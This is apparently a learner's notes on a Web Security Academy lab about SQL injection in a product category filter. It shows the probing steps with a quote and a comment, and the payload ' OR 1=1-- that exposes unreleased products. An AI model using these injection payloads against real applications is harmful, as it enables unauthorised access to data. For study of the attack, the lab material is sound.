SQL injection - product category filter

Example query:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Example request:
`https://acf91f4a1e4d883480026db800f10008.web-security-academy.net/filter?category=Gifts`

`?category=` likely to be vulnerable to SQLi

End goal: display all products both released and unreleased

## Analysis:

Check if the app is vulnerable to SLQi by adding `'`

E.g`?category='` This caused an internal server error and makes
me think it is vulnerable

Also tried with a comment:
`SELECT * FROM products WHERE category = ''--' AND released = 1`
E.g`?category='--` This caused an internal server error and makes
me think it is vulnerable

`SELECT * FROM products WHERE category = ''--' AND released = 1`

This returns all products and all published states because,
category is an empty string and 1=1 resolves to true
`SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1`

